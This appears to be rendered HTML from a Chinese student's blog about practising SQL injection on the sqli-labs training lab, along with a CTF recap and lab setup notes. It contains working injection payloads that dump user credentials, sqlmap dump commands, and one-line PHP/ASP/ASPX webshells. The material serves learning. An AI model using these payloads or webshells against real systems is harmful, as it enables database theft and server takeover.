+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/27/less5,6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/27/less5,6/" class="post-title-link" itemprop="url">lesson5，6总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-27 12:19:09" itemprop="dateCreated datePublished" datetime="2021-10-27T12:19:09+08:00">2021-10-27</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-06 17:15:56" itemprop="dateModified" datetime="2022-02-06T17:15:56+08:00">2022-02-06</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1.注入类型"></a>1.注入类型</h1><p><strong>sql注入形成的原因：用户被输入的非法数据被解释器执行</strong></p>
+<h2 id="由注入类容区分为："><a href="#由注入类容区分为：" class="headerlink" title="由注入类容区分为："></a>由注入类容区分为：</h2><ol>
+<li>数字类型注入</li>
+<li>字符类型注入</li>
+</ol>
+<h2 id="由提交方式分为："><a href="#由提交方式分为：" class="headerlink" title="由提交方式分为："></a>由提交方式分为：</h2><ol>
+<li>get注入</li>
+<li>post注入</li>
+<li>cookies注入</li>
+<li>http注入</li>
+</ol>
+<h2 id="由获取信息不同分为："><a href="#由获取信息不同分为：" class="headerlink" title="由获取信息不同分为："></a>由获取信息不同分为：</h2><ol>
+<li>基于bool的盲注，即可以根据返回页面判断条件真假的注入</li>
+<li>基于时间的盲注，即不能根据页面返回类容判断任何信息，需要用条件语句查看时间延迟语句是否执行来判断。</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接放回在页面中。</li>
+</ol>
+<hr>
+<hr>
+<p>很明显less1-4都是基于页面返回错误信息的报错注入，而从less5开始接触基于返回页面判断语句真假的bool注入</p>
+<p><img src="https://i.loli.net/2021/10/27/oD3qw2Fr7TzHImE.png" alt="QQ截图20211027124159.png"></p>
+<p>同样的用?id=1’ –+来判断注入</p>
+<p>用?id=1’ order by 3–+来判断列数</p>
+<p>但是无法用union select 来输出我们想要的内容</p>
+<p>而是需要运用到 left（a,b）来<del>（推测）</del>暴力破解出它的表名，列名，库名甚至是字段</p>
+<p>先演示，用?id=1’ and left((database()),1)=’a’ –+</p>
+<p><img src="https://i.loli.net/2021/10/27/JbPU9kNjqZc6oxG.png" alt="QQ截图20211027125618.png"></p>
+<p>以此类推直到查到库名的第一个字符是’s’</p>
+<p><img src="https://i.loli.net/2021/10/27/xRpUOGof3X781tB.png" alt="QQ截图20211027125834.png"></p>
+<p>然后再爆破库名第二个字符</p>
+<p>直到我们把库名，表名，列名还有字段都爆破出来。</p>
+<p>想到这头皮发麻，那么有没有更简单的方法呢？有！</p>
+<hr>
+<h1 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h1><p>利用ascii()来将返回的字母转换成数字(整型)，</p>
+<p>?id=1’ and ascii(substr((database()),1,1))&gt;110–+来减少执行语句的优化。</p>
+<p>一般般。</p>
+<hr>
+<h1 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h1><p>用burpsuite挂代理（proxy）</p>
+<p><img src="https://i.loli.net/2021/10/27/mKYzUd1gnE8SBFu.png" alt="QQ截图20211027130429.png"></p>
+<p>然后把请求发给instruder</p>
+<p><img src="https://i.loli.net/2021/10/27/SRiKkcAfvL37Zad.png" alt="QQ截图20211027130503.png"></p>
+<p>对left((database()),1)=’’ 引号里面 add$,单参数</p>
+<p>调整sniper的攻击模式，调整字典为“abcdefghijklmnopqrstuvwxyz”</p>
+<p>然后start attack，开始爆破</p>
+<p><img src="https://i.loli.net/2021/10/27/h6IV3isf5jwgprl.png" alt="QQ截图20211027132122.png"></p>
+<p>然后字长不一样的就是正确的</p>
+<p>这样省了我们改字母的时间但是无法明确的给出库名还是得一个一试然后拼凑在一起。</p>
+<p>那么还有更简便的方法吗？有</p>
+<hr>
+<h1 id="sqlmap应用"><a href="#sqlmap应用" class="headerlink" title="sqlmap应用"></a>sqlmap应用</h1><h2 id="哈哈！时代变啦！"><a href="#哈哈！时代变啦！" class="headerlink" title="哈哈！时代变啦！"></a>哈哈！时代变啦！</h2><p>直接cmd-&gt;py sqlmap.py  -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=&#39;">http://localhost/Less-5/?id=&#39;</a> –dbs  爆库</p>
+<p>py  sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” –tables 爆表</p>
+<p>py sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” –columns 爆字段</p>
+<p>py sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” -C”字段名” –dump  打包丢出</p>
+<p>简单易懂，一步到位</p>
+<p>详见“鲲鹏杯战后总结”</p>
+<hr>
+<h1 id="补充基本知识"><a href="#补充基本知识" class="headerlink" title="补充基本知识"></a>补充基本知识</h1><ol>
+<li>一句话木马：</li>
+</ol>
+<p>php的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_post</span>[<span class="string">&quot;crow&quot;</span>]);<span class="meta">?&gt;</span>  <span class="comment">//其中crow为密码</span></span><br></pre></td></tr></table></figure>
+<p>asp的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval requst(crow)%&gt;</span><br></pre></td></tr></table></figure>
+<p>aspx的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;啥语言&quot;%&gt;&lt;%eval(Requst.Item[&quot;crow&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>配合 菜刀 蚁剑 食用 味道更佳</p>
+<ol start="2">
+<li>load_file() 读取当地文件</li>
+<li>into outfile 写文件  select ‘crow666’ into outfile  ‘C:\phpstudy\text.txt’</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/21/%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E6%88%98%E5%90%8E%E6%80%BB%E7%BB%93%E2%80%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/21/%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E6%88%98%E5%90%8E%E6%80%BB%E7%BB%93%E2%80%9D/" class="post-title-link" itemprop="url">“鲲鹏杯战后总结”</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-21 19:10:17" itemprop="dateCreated datePublished" datetime="2021-10-21T19:10:17+08:00">2021-10-21</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-23 12:50:02" itemprop="dateModified" datetime="2022-02-23T12:50:02+08:00">2022-02-23</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="善用工具"><a href="#善用工具" class="headerlink" title="善用工具"></a>善用工具</h1><p>工欲善其事，必先利其器。好的工具一程度上能够压缩工作量，来使我们更高效的挖掘flag</p>
+<h2 id="dirsearch（目录扫描工具）"><a href="#dirsearch（目录扫描工具）" class="headerlink" title="dirsearch（目录扫描工具）"></a>dirsearch（目录扫描工具）</h2><p><img src="https://i.loli.net/2021/10/21/S5pHdzOim1Ugr27.png" alt="QQ截图20211021201535.png"></p>
+<p>常用命令：</p>
+<p>python dirsearch.py -u URL -e php</p>
+<p>-u 指定目标ip</p>
+<p>-e 指定网站语言</p>
+<p>-w 加上自己的字典</p>
+<p>-random-agents使用代理</p>
+<h2 id="sqlmap（针对sql注入的工具）"><a href="#sqlmap（针对sql注入的工具）" class="headerlink" title="sqlmap（针对sql注入的工具）"></a>sqlmap（针对sql注入的工具）</h2><p><img src="https://i.loli.net/2021/10/21/57MWvhqbnD2g3XF.png" alt="QQ截图20211021201739.png"></p>
+<p>常用命令：</p>
+<p>sqlmap -u “URL” 指定目标</p>
+<p>sqlmap -m 1.txt 获取多个url</p>
+<p>sqlmap -r URL.txt  从文件中加载http请求</p>
+<p>sqlmap -g  利用谷歌获取目标</p>
+<p>sqlmap -l burp.txt</p>
+<p>—dbs 查看所有可用数据库</p>
+<p>-D&lt;库名&gt; –tables（查看某库下面的可用表）</p>
+<p>-D&lt;库名&gt; -T&lt;对应的数据库表名&gt;  – column（查询某数据库某表下的所有列名）</p>
+<h1 id="目标明确（以下是毫无营养的经验之谈）"><a href="#目标明确（以下是毫无营养的经验之谈）" class="headerlink" title="目标明确（以下是毫无营养的经验之谈）"></a>目标明确（以下是毫无营养的经验之谈）</h1><p>战场上紧张的情绪会影响心态，要调整心态明确目标。</p>
+<h2 id="每个题目都看（毕竟菜逼，要挑软柿子捏）"><a href="#每个题目都看（毕竟菜逼，要挑软柿子捏）" class="headerlink" title="每个题目都看（毕竟菜逼，要挑软柿子捏）"></a>每个题目都看（毕竟菜逼，要挑软柿子捏）</h2><p>就所有类型题目都看一遍嘛。web题就看看源代码，misc就改改文件名啊。</p>
+<p>这次也是运气非常好让我做出了web1，就是审查源代码找到了一个表情包的转码，但确实有点费眼睛（不得不说dirsearch真的好用，学到了！学到了！）</p>
+<h2 id="善用搜索"><a href="#善用搜索" class="headerlink" title="善用搜索"></a>善用搜索</h2><p>遇到非常恐怖的代码有一个小技巧，ctrl+a，Ctrl+c，复制到记事本里然后</p>
+<p>在编辑里面查找关键词（例如flag），可以省去一大段代码审计的时间。。。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/08/less1-4%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/08/less1-4%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">less1~4总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-08 20:23:03" itemprop="dateCreated datePublished" datetime="2021-10-08T20:23:03+08:00">2021-10-08</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-25 21:28:40" itemprop="dateModified" datetime="2022-02-25T21:28:40+08:00">2022-02-25</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="sql注入基本步骤"><a href="#sql注入基本步骤" class="headerlink" title="sql注入基本步骤"></a>sql注入基本步骤</h1><ol>
+<li><p>单引号，and 1=1，and 1=2，双引号括号来判断是否存在错误</p>
+</li>
+<li><p>order by 判断数据有多少列</p>
+</li>
+<li><p>寻找那些数据回显</p>
+</li>
+<li><p>利用union 查询或者报错注入</p>
+</li>
+<li><p>获取数据库，版本等信息</p>
+</li>
+<li><p>最后获取获取信息</p>
+</li>
+</ol>
+<h1 id="less-1下面都是我的心路历程"><a href="#less-1下面都是我的心路历程" class="headerlink" title="less 1下面都是我的心路历程"></a>less 1下面都是我的心路历程</h1><p>顺便补充这是在网页上进行的操作，前几天我一直在mysql命令行操作，那是不对的，怎么说，我的理解是sql-libs原本应该用虚拟机搭建的（是管理员方），然后web浏览器的操作上操作（是游客方），sql注入问题就是会让游客方看到管理员方能看到的数据但我之前一直用mysql命令行输操作（就是管理员方查看数据毫无意义），我看我自己行为。</p>
+<p>首先 输入</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=1">http://localhost/Less-1/?id=1</a> 是正常返回的，</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/10/09/FAugm8taksVd3er.png" alt="QQ截图20211009123350.png"></p>
+<p>当输入</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=1%27">http://localhost/Less-1/?id=1%27</a> （%27 是单引号，url自动转换的），这里可以判断有注入问题，</p>
+</blockquote>
+<p>输入</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=1&#39;order">http://localhost/Less-1/?id=1&#39;order</a> by2<br>开始报错，由报错内容可知道我们输入的‘order by’与后面的‘limit 0,1’语法冲突了，这是什么意思呢？</p>
+</blockquote>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211009123956628.png" alt="image-20211009123956628"></p>
+<p>让我们打开根目录的文件看看吧，查找带limit的函数（虽然是‘我看我自己’行为，但是这样方便自己理解）</p>
+<p>这里有一句$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+<p>为了方便后面学习，我们可以在下面打</p>
+<blockquote>
+<p>echo $sql;//这里意思是print sql 以字符串形式</p>
+<p>echo “《br》” ;//因为我这里打出来就变成换行了，所以我用中文打符号，懂都懂<br><img src="https://i.loli.net/2021/10/09/dgsMq6SvlDeLryI.png" alt="QQ截图20211009161844.png"></p>
+</blockquote>
+<p>当我们在mysql命令行中输入后，返回数据对比发现SELECT * FROM users WHERE id=’1’ LIMIT 0,1返回的数据和在web输入？ID=1返回的数据有些相同又有些不同，但是我们可以经过修改？ID=2 ？ID=3发现我们在web上输入的？ID=1，是给$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;中的“ID”赋值，那么我们基本上就能猜到这个语句就是返回数据的。</p>
+<p><img src="https://i.loli.net/2021/10/09/xgRpJceHryQNinV.png" alt="QQ截图20211009145206.png"></p>
+<p>这样我们就知道了第二步中，ID被我们赋值成了“1’ order by”，语句变成了</p>
+<p>select  * from user where id=’1’ order by10’ limit 0,1;</p>
+<p>这个语句肯定是不能执行的，所以我们通过将多出来的单引号和后面的limit0,1注释（–+，#，–都可以）掉，让order by 语句合法。</p>
+<p>输入？id=1’  order by10 –+通过这种方法来利用是否报错来判断数据有多少列。</p>
+<p><img src="https://i.loli.net/2021/10/09/4P8ugfHAmyE6zor.png" alt="QQ截图20211009160530.png"></p>
+<p>这里没有报错，但是也没有回显，说明没有第10列。</p>
+<p>输入？id=1’ order by 3 –+正常回显，说明数据有三列</p>
+<p><img src="https://i.loli.net/2021/10/09/6KUQ8kMjioE4rnG.png" alt="QQ截图20211009162156.png"></p>
+<p>然后输入？Id=-1’ union select 1,2,3–+ 查看哪些数据可以回显（1,2，3。。取决于多少列）</p>
+<p>利用回显输入？id=-1‘ union select 1,2，databases（）–+可以查看数据库名称；</p>
+<p>输入？id-1‘ union select 1，2 ，schema_name from information_schema.schemata –+ 可以返回第一个数据库通过加入limit 1,2可以输出第二个数据库名称但是跟我们想象的不一样，只输出了一个数据库名称，</p>
+<p>这样一次次是可以得到所以的数据库名称</p>
+<p>或者更简单一次性输出</p>
+<p>输入？id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<p>了解了group_concat()之后查表也就方便很多</p>
+<p>输入?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_name=’security’–+ (最好把security改成16进制来避免出现引号问题)</p>
+<p>输入?id=-1’ union select 1,2,group_concat(column_name) from informaion_schema.columns where</p>
+<p>table_name=’users’</p>
+<p>输入?id=-1’union select 1,2,group_concat(username) from security.users–+取出所有用户名</p>
+<p>输入?id=-1’union select 1,2,group_concat(password) from security.users–+取出所有的密码</p>
+<p>这种操作复杂，但是我找到巨佬的进阶操作，666</p>
+<h2 id="进阶操作group-concat（）嵌套concat-ws-‘任意’，a，b-优化用户名和密码的获取"><a href="#进阶操作group-concat（）嵌套concat-ws-‘任意’，a，b-优化用户名和密码的获取" class="headerlink" title="进阶操作group_concat（）嵌套concat_ws(‘任意’，a，b)优化用户名和密码的获取"></a>进阶操作group_concat（）嵌套concat_ws(‘任意’，a，b)优化用户名和密码的获取</h2><p>输入?id=-1’ union select 1,2,group_concat(concat_ws(‘~’，username，password)) from security.users–+</p>
+<p>将username和password拼凑输出</p>
+<hr>
+<h1 id="order-by-语句解读"><a href="#order-by-语句解读" class="headerlink" title="order by 语句解读"></a>order by 语句解读</h1><p>由上可知道 order by是用来推测数据库的列数，但是他的真正用途是给指定的列asdf对结果集进行排序的。（用途百度来的）用一种更直观的方式来表达。</p>
+<p>这是 order by 前的数据库</p>
+<p>order by 2后（一目了然，不枉费我玩了两天mysql）</p>
+<hr>
+<h1 id="union-select-指令解读"><a href="#union-select-指令解读" class="headerlink" title="union select 指令解读"></a>union select 指令解读</h1><p>在执行过 union select 1,2,3后，自动填充了一行1,2,3，所以在使用之前要判断列数；</p>
+<p>select 1,2,3 select直接加数字串，这里的字符串就变成了一个数组（是一个行向量，就是会与列表从左到右一一对应）</p>
+<p>id=-1  联合查询后两个查询结果合并输出，因此要然id=-1报错，才能输出最后一行来判断哪些位置回显；</p>
+<p><img src="https://i.loli.net/2021/10/09/v7lMpV3oG4Hr6K8.png" alt="QQ截图20211009203759.png"></p>
+<hr>
+<h1 id="select-from-users-where-id-’1‘-limit-0-1；解读"><a href="#select-from-users-where-id-’1‘-limit-0-1；解读" class="headerlink" title="select * from users where id=’1‘ limit 0,1；解读"></a>select * from users where id=’1‘ limit 0,1；解读</h1><p>根据解题过程select * from users where id=’1‘ limit 0,1 大概能猜到这是一个返回数据的指令</p>
+<p>但是当我们把where语句去掉select * from users limit 0,1他任然可以正常返回而且返回值跟不改一样；</p>
+<p><img src="https://i.loli.net/2021/10/09/xw4LiEG8fnqvgQP.png" alt="QQ截图20211009211815.png"></p>
+<p>当我改成limit1，2；时，返回值变成了两个分别是id 2，3的username和password;</p>
+<p>我第一时间联想到了c语言中的for循环语句for(int i=0;i&lt;n;i++) limit 0，1；</p>
+<p>两个变量分别表示输出地址起点 和 输出次数。</p>
+<hr>
+<h1 id="group-concat-解读"><a href="#group-concat-解读" class="headerlink" title="group_concat()解读"></a>group_concat()解读</h1><p>?id=-1’union select 1,2,group_concat(password) from security.users</p>
+<p>将security下的所有password组成一行字符串输出，但是连接字符是有长度限制的，默认为1024；</p>
+<p>所以如果结果字符串太长的话，就会在在数据库中被截取，因此没有显示全部数据。</p>
+<p>可以利用</p>
+<blockquote>
+<p>set global group_concat_max_len=1 //来调整输出的最大字符串长度</p>
+</blockquote>
+<hr>
+<h1 id="concat-ws-‘任意符号’，a，b-解读"><a href="#concat-ws-‘任意符号’，a，b-解读" class="headerlink" title="concat_ws(‘任意符号’，a，b)解读"></a>concat_ws(‘任意符号’，a，b)解读</h1><p>就是将a和b 用任意符号连接</p>
+<p>concat_ws(‘~’,a,b)</p>
+<p>a~b</p>
+<p>但是只能输出一个用户名的密码所以要嵌套在group_concat()内</p>
+<hr>
+<h1 id="基本操作语句（jc）"><a href="#基本操作语句（jc）" class="headerlink" title="基本操作语句（jc）"></a>基本操作语句（jc）</h1><blockquote>
+<p>select system_user()  //显示系统用户</p>
+<p>select user（）//显示系统用户</p>
+<p>select version（）//显示MySQL版本信息</p>
+<p>select database（）//显示数据库名称</p>
+<p>select @@datadir //显示MySQL安装路径</p>
+<p>select @@version_compile_os; //显示操作系统版本</p>
+<p>left(a,b)//从左开始截取a的前b位判断，正确返回1，错误返回0</p>
+<p>select user() regexp ‘r’;    regexp为匹配字符串user()的正则表达式，不管输入多少，相同                                                                                                                                                                                                  </p>
+</blockquote>
+<hr>
+<p><img src="https://s2.loli.net/2022/02/25/OaveyfJD5Slhq8u.png" alt="QQ浏览器截图20190406021639.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/06/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/06/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/" class="post-title-link" itemprop="url">sql注入之sqli-labs</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-06 16:27:22" itemprop="dateCreated datePublished" datetime="2021-10-06T16:27:22+08:00">2021-10-06</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-23 12:53:50" itemprop="dateModified" datetime="2022-02-23T12:53:50+08:00">2022-02-23</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="sql-是啥？"><a href="#sql-是啥？" class="headerlink" title="sql 是啥？"></a>sql 是啥？</h1><p>sql是用于访问和处理数据库的标准计算机语言。<del>没错又是一门语言,woc</del></p>
+<h2 id="首先搭建php环境"><a href="#首先搭建php环境" class="headerlink" title="首先搭建php环境"></a>首先搭建php环境</h2><p>虽然咱啥都不会，但是我精通各类软件的安装、下载（doge）！！！</p>
+<p><img src="https://i.loli.net/2021/10/06/NQ5Y3qPEVvz9jnR.png" alt="QQ截图20211006163829.png"></p>
+<p>但<strong>奇怪</strong>的是贴吧上很多巨佬都推荐我用5.6.9的php版本，可我7.3.4的版本照样用得好好地。</p>
+<p><del>（咱也不敢说，咱也不敢问）</del></p>
+<h2 id="下载sqli-labs"><a href="#下载sqli-labs" class="headerlink" title="下载sqli-labs"></a>下载sqli-labs</h2><p>然后打开群文件里的<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">项目地址</a>去github 去下</p>
+<p>也可以在PHPstudy的WWW文件夹下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  git <span class="built_in">clone</span> https://github.com/Audi-1/sqli-labs.git sqli-labs</span><br></pre></td></tr></table></figure>
+
+<p>就可以了</p>
+<h2 id="最后搭建网站"><a href="#最后搭建网站" class="headerlink" title="最后搭建网站"></a>最后搭建网站</h2><p>点开阿帕奇和MYsql就行了，像上面那张图那样（有图真是超方便）</p>
+<h3 id="ps：我找到了一个可以上传图片的-好地方-（https-sm-ms-）"><a href="#ps：我找到了一个可以上传图片的-好地方-（https-sm-ms-）" class="headerlink" title="ps：我找到了一个可以上传图片的[好地方]（https://sm.ms/）"></a>ps：我找到了一个可以上传图片的[好地方]（<a target="_blank" rel="noopener" href="https://sm.ms/%EF%BC%89">https://sm.ms/）</a></h3><p>直接访问网络图片超方便。</p>
+<p>言归正传，打开后再点开管理里面的打开网站</p>
+<p><img src="https://i.loli.net/2021/10/06/zVg3deXYU2Z8Ecx.png" alt="QQ截图20211006170538.png"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>然后就弹出来了</p>
+<p><img src="https://i.loli.net/2021/10/06/W9sN8mePHxkcb6Q.png" alt="QQ截图20211006170820.png"></p>
+<p>如果是第一次搭php环境弹出来的是另外的东西，我已经把之前WWW里面的文件删掉了换成了sqli-labs。</p>
+<p><img src="https://i.loli.net/2021/10/06/NhZQ63enblWXzr1.png" alt="QQ截图20211006171252.png"></p>
+<p>你以为这样就完了吗？随便点开一个东西，我就被警告了</p>
+<p><img src="https://i.loli.net/2021/10/06/DPkhO1YQs9NaTV6.jpg" alt="c633f4d97eaf12b46b4923112b20564ac679542c.jpg"></p>
+<p>但解决方法也很简单，就打开</p>
+<p>sql-connections把db-creds.inc里面的password初始化一下就好了。</p>
+<h2 id="补充MYsql的基本用法"><a href="#补充MYsql的基本用法" class="headerlink" title="补充MYsql的基本用法"></a>补充MYsql的基本用法</h2><blockquote>
+<p>select schema_name from information_schema.schemata //查库</p>
+<p>select table_name from information_schema.table where table_schema=’security’//查表</p>
+<p>select column_name from information_schema.clumns where table_name=’users’//查列</p>
+<p>select username,password from security.users//查字段</p>
+</blockquote>
+<p>依次执行效果如下：</p>
+<p><img src="https://i.loli.net/2021/10/07/H6rmY1xkpzcIi7K.png" alt="QQ截图20211007132949.png"></p>
+<p><img src="https://i.loli.net/2021/10/07/XUr3It7gPTpFhz5.png" alt="QQ截图20211007133009.png"></p>
+<p><img src="https://i.loli.net/2021/10/07/hGMQYrvTSjFxV3J.png" alt="QQ截图20211007133031.png"></p>
+<p><strong>PS</strong>：第一幅正常来说没有‘NO connection’除非你网不好<del>（顺便吐槽一下校园网）</del></p>
+<img src="https://i.loli.net/2021/10/07/UZl4YGI6rHMvpxV.png" alt="QQ截图20211007133846.png" style="zoom:120%;" />
+
+<p>还有建议不要下最新的PHPstudy，它的sql命令行的按钮不知道被谁扣掉了</p>
+<p>要用cmd cd 那个sql.exe的文件地址</p>
+<p>然后执行</p>
+<blockquote>
